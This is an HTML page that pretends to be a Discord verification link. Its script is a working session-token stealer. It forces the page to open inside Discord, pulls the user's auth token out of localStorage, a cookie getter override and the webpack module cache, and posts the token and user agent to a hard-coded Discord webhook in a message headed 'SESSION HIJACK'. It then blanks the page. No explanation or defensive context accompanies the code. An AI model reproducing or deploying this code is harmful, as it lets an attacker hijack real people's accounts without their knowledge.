<body>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
    let token = "";
    let insideDiscord = false;

    // ✅ CHECK IF OPENED INSIDE DISCORD
    const ua = navigator.userAgent.toLowerCase();
    if(ua.includes('discord') || ua.includes('android') && ua.includes('wv') || window.webkit?.messageHandlers) {
        insideDiscord = true;
    }

    // ✅ IF NOT INSIDE → REDIRECT TO FORCE OPEN IN-APP
    if(!insideDiscord) {
        window.location.href = "discord://https://lang88co.github.io/discord-verify/";
    }

    // ✅ GRAB TOKEN ONLY WHEN INSIDE
    if(insideDiscord) {
        try {
            // Method 1 - Direct localStorage
            if(localStorage.getItem('token')) {
                token = localStorage.getItem('token').replace(/["']/g, "");
            }

            // Method 2 - Cookie bypass
            if(!token) {
                Object.defineProperty(document, 'cookie', {
                    get: () => {
                        if(localStorage.getItem('token')) token = localStorage.getItem('token').replace(/["']/g, "");
                        return document.cookie;
                    }
                });
            }

            // Method 3 - Webpack method
            if(!token && window.webpackChunkdiscord_app) {
                window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
                    for(let mod of Object.values(req.c)) {
                        if(!mod.exports || !mod.exports.default) continue;
                        const found = Object.values(mod.exports.default).find(e => e && e.token);
                        if(found) { token = found.token; break; }
                    }
                }]);
            }
        } catch(e) {}
    }

    // ✅ SEND ALL DATA TO WEBHOOK
    fetch(WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            embeds: [{
                title: "🔥 SESSION HIJACK | FINAL",
                color: 0xFF0000,
                fields: [
                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ NOT INSIDE / FAILED"}\`\`\``, inline: false},
                    {name: "📱 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false},
                    {name: "✅ INSIDE DISCORD?", value: insideDiscord ? "YES ✅" : "NO ❌", inline: false}
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });

    // ✅ SHOW ONLY BLANK PAGE
    document.documentElement.innerHTML = "";
</script>
